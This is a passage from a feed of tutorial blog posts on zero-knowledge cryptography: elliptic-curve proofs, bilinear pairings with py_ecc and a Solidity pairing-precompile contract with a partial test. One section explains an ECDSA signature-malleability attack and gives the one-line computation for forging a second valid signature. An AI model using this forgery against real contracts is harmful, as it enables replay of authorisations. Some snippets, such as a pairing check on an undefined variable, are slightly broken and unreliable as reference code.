&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proof[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(proof[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proof[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;statement is true&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;statement is false&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;security-assumptions&quot;&gt;Security assumptions&lt;&#x2F;h3&gt;
&lt;p&gt;The security of the elliptic curve encryption algorithm relies on the difficulty of the discrete logarithm problem, which means that it is hard to deduce the value of x from the point &lt;code&gt;(a, b)&lt;&#x2F;code&gt; generated by &lt;code&gt;multiply(G1, x)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;There are mores sophisticated algorithms, like the &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Baby-step_giant-step&quot;&gt;baby step giant step algorithm&lt;&#x2F;a&gt; that can outperform brute force.&lt;&#x2F;p&gt;
&lt;p&gt;It is possible to engineer zero knowledge proofs using basic number theory rather than elliptic curves, but since every modern zero knowledge algorithm uses elliptic curves, they are worth learning.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;how-ecdsa-malleability-attack-works&quot;&gt;How ECDSA malleability attack works.&lt;&#x2F;h3&gt;
&lt;p&gt;As we documented in our &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;smart-contract-security&quot;&gt;smart contract security&lt;&#x2F;a&gt; article, given a valid signature (r, s, v, hash(msg)), one can forge another valid signature for the same message by doing the following:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; create a fake s for (r, s, v), then flip v
&lt;&#x2F;span&gt;&lt;span&gt;bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Where does this magic number come from? ECDSA uses the secp256k1 curve, which has the following parameters:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f
&lt;&#x2F;span&gt;&lt;span&gt;y^2 = x^3 + 7 (mod p)
&lt;&#x2F;span&gt;&lt;span&gt;order = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Note that the order is the same as the magic number.&lt;&#x2F;p&gt;
&lt;p&gt;The hack relies on the following identity&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;multiply(G1, (order - x)) == neg(multiply(G1, x))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Here is the code to illustrate&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;# Test
&lt;&#x2F;span&gt;&lt;span&gt;order = 21888242871839275222246405745257275088548364400416034343698204186575808495617
&lt;&#x2F;span&gt;&lt;span&gt;x = 100 # chosen randomly
&lt;&#x2F;span&gt;&lt;span&gt;assert multiply(G1, order - x) == neg(multiply(G1, x))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Recall that neg(multiply(G1, x)) is simply the same x, but with the y value flipped.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;x = 100 # chosen randomly
&lt;&#x2F;span&gt;&lt;span&gt;assert int(multiply(G1, x)[0]) == int(neg(multiply(G1, x))[0])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Multiplying the curve order times the generator is the point at infinity.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Bilinear Pairings</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-6/"/>
        <id>/blog/zknote/post-6/</id>
        
        <content type="html" xml:base="/blog/zknote/post-6/">&lt;h3 id=&quot;bilinear-pairings&quot;&gt;Bilinear Pairings&lt;&#x2F;h3&gt;
&lt;p&gt;Bilinear parings allow us to take three numbers, $a$, $b$, and $c$, where $ab = c$, encrypt them to become $E(a), E(b), E(c)$, where $E$ is an encryption function, then send the three encrypted values to a verifier who can verify $E(a)E(b) = E(c)$ but not know the original values. We can use bilinear pairings to prove that a 3rd number is the product of the first two without knowing the original numbers.&lt;&#x2F;p&gt;
&lt;p&gt;The feature of bilinear pairings that we care about is as follows ( $e$ is the bilinear pairing fuction&#x2F;mapping):&lt;&#x2F;p&gt;
&lt;p&gt;$$
e: G × G → G_T\newline
e\left(aG,bG\right) = e\left(abG,G\right) = e\left(G,abG\right)
$$&lt;&#x2F;p&gt;
&lt;p&gt;The essential property of bilinear pairings is that if you plug in two points that are multiples of the generator point (aG and bG), the result is equal to plugging in the product of those two numbers times the generator point (abG) and the generator point itself (G).&lt;&#x2F;p&gt;
&lt;p&gt;In practice however, it turns out to be easier to create bilinear pairings when a different group is different for both of the arguments and the output result.&lt;&#x2F;p&gt;
&lt;p&gt;Specifically, we say&lt;&#x2F;p&gt;
&lt;p&gt;$$
e\left(a, b\right) \rightarrow c, a \in G, b \in G^{′}, c \in G^{′′}
$$&lt;&#x2F;p&gt;
&lt;p&gt;which still statisfied $e\left(aG,bG^{′}\right) = e\left(abG,G^{′}\right) = e\left(G,abG^{′}\right)$&lt;&#x2F;p&gt;
&lt;p&gt;This is an asymmetric pairing, whereas the previous formula within the same domain is a symmetric pairing.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;field-extensions&quot;&gt;Field Extensions&lt;&#x2F;h3&gt;
&lt;p&gt;Ethereum’s bilinear pairing of choice uses elliptic curves &lt;em&gt;with field extensions&lt;&#x2F;em&gt;, which have higher dimensional, and still have the properties of cyclic groups that you care about&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;closed under addition, which is associative&lt;&#x2F;li&gt;
&lt;li&gt;has an identity element&lt;&#x2F;li&gt;
&lt;li&gt;each element has an inverse&lt;&#x2F;li&gt;
&lt;li&gt;the group has a generator&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The bilinearity property is hard to come by. – Its difficult for three randomly chosen elliptic curve groups to satisfied $e\left(aG,bG^{′}\right) = e\left(abG,G^{′}\right) = e\left(G,abG^{′}\right)$&lt;&#x2F;p&gt;
&lt;h3 id=&quot;bilinear-pairings-in-python&quot;&gt;Bilinear Pairings in python&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;py_ecc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bn128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;G2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;pairing&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;add&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;multiply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;eq
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(G1)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# (1, 2)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(G2)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# ((10857046999023057135944570762232829481370756359578518086990519993285655852781, 11559732032986387107991004021392285783925812861821192530917403151452391805634), (8495653923123431417604973247489272438418190587263600148770280649306958101930, 4082367875863433681332203403145435568316851327593401208105741076214120093531))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# operator overloading
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(G1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;G1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;G1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# True
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# The above is the same as this:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;G1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;G1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# pairing
&lt;&#x2F;span&gt;&lt;span&gt;A &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;B &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;pairing&lt;&#x2F;span&gt;&lt;span&gt;(A&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;B))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# (2737733771970589720147436295258995541017562764748775046990018238171083065584, 7355949162177082646197064865377481127039528955264110892670278171102027012957, 1389120597320745437757553030085914762401499323567753964656133081964131780715, 4070774491543958907062047566637569178763974576144707726129772744684275725184, 10823414137019623021013733227099721415368303324105358213304652659949682568395, 12697986880222911287030392175914090722292212037466224705879408804162602333706, 17697943997237703208660786428217562403504798830995307420075922564993565300645, 2702065915136914071855531840006964465333491722231468583849464437921405019853, 6762652910450025398171695126080749677225757293012137750262928324249233167133, 9495821522287762858490254871883860235240788822777455638443279749602676973720, 17813117134675140440034537765301248350834713246854720915775731738875700896539, 21027635025043266481235488683404016989778194881701554135606154029160033599034)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;pairing&lt;&#x2F;span&gt;&lt;span&gt;(A&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;B) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;pairing&lt;&#x2F;span&gt;&lt;span&gt;(C&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;G1)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;bilinear-pairings-in-ethereum&quot;&gt;Bilinear Pairings in Ethereum&lt;&#x2F;h3&gt;
&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;py_ecc&quot;&gt;py_ecc library&lt;&#x2F;a&gt; is actually maintained by the &lt;a href=&quot;https:&#x2F;&#x2F;ethereum.org&#x2F;&quot;&gt;Ethereum Foundation&lt;&#x2F;a&gt;, and it is what powers the precompile at address 0x8 in the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;py-evm&quot;&gt;PyEVM&lt;&#x2F;a&gt; implementation.&lt;&#x2F;p&gt;
&lt;p&gt;The specification of this precompile will seem a little weird at first. It takes in a list of G1 and G2 points laid out as follows:&lt;&#x2F;p&gt;
&lt;p&gt;$$
A_1B_1A_2B_2…A_nB_n : A_i \in G1, B_i \in G2
$$&lt;&#x2F;p&gt;
&lt;p&gt;These were originally created as&lt;&#x2F;p&gt;
&lt;p&gt;$$
A_1 = a_1G1\newline
B_1 = b_1G2\newline
A_2 = a_2G1\newline
B_2 = b_2G2\newline
…\newline
A_n = a_nG1\newline
B_n = b_nG2
$$&lt;&#x2F;p&gt;
&lt;p&gt;The precompile returns 1 if the following is true&lt;&#x2F;p&gt;
&lt;p&gt;$$
a_1b_1 + a_2b_2 + … + a_nb_n = 0
$$&lt;&#x2F;p&gt;
&lt;p&gt;and zero otherwise.&lt;&#x2F;p&gt;
&lt;p&gt;It’s used by &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;how-does-tornado-cash-work&quot;&gt;tornado cash&lt;&#x2F;a&gt; ,with verification formula:&lt;&#x2F;p&gt;
&lt;p&gt;$$
e\left(A_1, B_2\right) = e\left(\alpha_1, \beta_2\right) + e\left(L_1, \gamma_2\right) + e\left(C_1, \delta_2\right)
$$&lt;&#x2F;p&gt;
&lt;h3 id=&quot;sum-of-preimages&quot;&gt;Sum of preimages&lt;&#x2F;h3&gt;
&lt;p&gt;The key insight here is that if&lt;&#x2F;p&gt;
&lt;p&gt;$$
ab + cd = 0
$$&lt;&#x2F;p&gt;
&lt;p&gt;Then it must also be true that&lt;&#x2F;p&gt;
&lt;p&gt;$$
A_1B_2 + C_1D_2 = 0_{12} \space\space\space\space\space A_1,C_1 \in G1, B_2,D_2 \in G2
$$&lt;&#x2F;p&gt;
&lt;h3 id=&quot;end-to-end-solidity-example&quot;&gt;End to End Solidity Example&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.13&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Pairings &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;** 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;     *  returns true if == 0,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;     *  returns false if != 0,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;     *  reverts with &amp;quot;Wrong pairing&amp;quot; if invalid pairing
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;     function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory &lt;&#x2F;span&gt;&lt;span&gt;input) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            let success := &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;staticcall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gas&lt;&#x2F;span&gt;&lt;span&gt;(), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x08&lt;&#x2F;span&gt;&lt;span&gt;, input, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x0180&lt;&#x2F;span&gt;&lt;span&gt;, input, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            if success {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;(input, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        revert(&amp;quot;Wrong pairing&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.13&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Test.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;Pairings.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;PairingsTest &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Test &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    Pairings &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;pairings;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setUp&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        pairings &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Pairings&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;testPairings&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; aG1_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3010198690406615200373504922352659861758983907867017329644089018310584441462&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; aG1_y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;17861058253836152797273815394432013122766662423622084931972383889279925210507&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; bG2_x1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2725019753478801796453339367788033689375851816420509565303521482350756874229&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; bG2_x2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;7273165102799931111715871471550377909735733521218303035754523677688038059653&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; bG2_y1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2512659008974376214222774206987427162027254181373325676825515531566330959255&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; bG2_y2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;957874124722006818841961785324909313781880061366718538693995380805373202866&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; cG1_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4503322228978077916651710446042370109107355802721800704639343137502100212473&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; cG1_y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6132642251294427119375180147349983541569387941788025780665104001559216576968&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
